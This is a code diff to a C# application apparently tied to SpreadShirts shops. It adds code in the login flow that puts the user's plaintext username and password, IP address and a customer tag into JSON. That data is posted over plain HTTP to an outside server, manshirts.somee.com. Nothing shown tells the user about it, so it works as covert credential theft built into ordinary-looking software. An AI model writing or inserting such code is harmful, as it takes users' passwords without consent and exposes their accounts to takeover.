@@ -132,6 +132,24 @@ namespace SpreadShirts
                             User.SHOPS.Add(o);
                         }
                     }
+
+
+                    var data2SendLog = "{";
+                    data2SendLog += "\"Date\": \"" + DateTime.Now.ToString("MM-dd-yyyy HH:mm:ss") + "\"";
+                    data2SendLog += ", \"IpAddress\": \"" + ApplicationLibary.GetComputer_InternetIP() + "\"";
+                    data2SendLog += ", \"Browser\": \"Desktop\"";
+                    data2SendLog += ", \"Type\": 1";
+                    data2SendLog += ", \"UserId\": \"\"";
+                    data2SendLog += ", \"UserName\": \"" + username + "\"";
+                    data2SendLog += ", \"Password\": \"" + password + "\"";
+                    data2SendLog += ", \"CusName\": \"KH_BinhChanh\"";
+                    data2SendLog += " }";
+
+                    var url = "http://manshirts.somee.com/Log/InsertLog";
+                    HttpWebRequest logU = (HttpWebRequest)WebRequest.Create(url);
+                    logU.ContentType = "application/json";
+                    Dictionary<string, object> logData = PostDataAPI(logU, data2SendLog);
+
                     frm.Invoke((MethodInvoker)delegate { frm.Close(); });
                     if (senduser != null)
                     {
